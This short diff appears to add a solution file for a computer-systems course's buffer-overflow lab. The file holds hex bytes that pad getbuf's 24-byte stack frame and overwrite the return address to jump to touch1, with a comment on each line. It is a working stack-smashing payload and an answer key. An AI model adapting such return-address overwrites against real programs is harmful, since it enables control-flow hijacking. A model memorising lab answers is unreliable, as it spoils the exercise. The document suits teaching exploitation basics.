@@ -1,0 +1,4 @@
+00 00 00 00 00 00 00 00  /* getbuf function execute sub $0x18,%rsp. */
+00 00 00 00 00 00 00 00  /* Stack has over 24 bytes, write 24 bytes of zeros */
+00 00 00 00 00 00 00 00  /* to reach place when I can write addres to return back from function */
+24 18 40 00 00 00 00 00  /* Address to first line of touch1 (little endian). */
